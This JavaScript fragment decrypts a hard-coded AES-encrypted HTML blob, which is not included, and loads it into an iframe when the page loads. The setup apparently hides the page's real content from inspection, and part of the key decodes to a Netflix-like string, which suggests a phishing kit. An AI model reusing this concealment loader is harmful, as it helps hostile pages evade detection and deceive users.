var KEY_HEX = "4E657466C16978214465765769C16C6C546563685369677363726574323032";
var IV_HEX  = "4E65D7466C69784467FF9056C16C6C54";

function hexToBytes(hex){
  var bytes=new Uint8Array(hex.length/2);
  for(var i=0;i<hex.length;i+=2)bytes[i/2]=parseInt(hex.substr(i,2),16);
  return bytes;
}

async function decryptAndLoad(){
  try{
    var keyBytes = hexToBytes(KEY_HEX);
    var ivBytes  = hexToBytes(IV_HEX);
    var encBytes = Uint8Array.from(atob(ENC),c=>c.charCodeAt(0));

    var cryptoKey = await crypto.subtle.importKey(
      'raw', keyBytes, {name:'AES-CBC'}, false, ['decrypt']
    );
    var decrypted = await crypto.subtle.decrypt(
      {name:'AES-CBC', iv:ivBytes}, cryptoKey, encBytes
    );
    var html = new TextDecoder().decode(decrypted);

    // Carregar no iframe via blob
    var blob = new Blob([html], {type:'text/html'});
    var url  = URL.createObjectURL(blob);
    var fr   = document.getElementById('fr');
    fr.onload = function(){
      document.getElementById('ls').style.display='none';
      fr.style.display='block';
    };
    fr.src = url;
  }catch(e){
    document.getElementById('ls').innerHTML='<div style="color:#FF453A;font-family:monospace;font-size:13px;">Erro ao carregar</div>';
  }
}

decryptAndLoad();
</script>
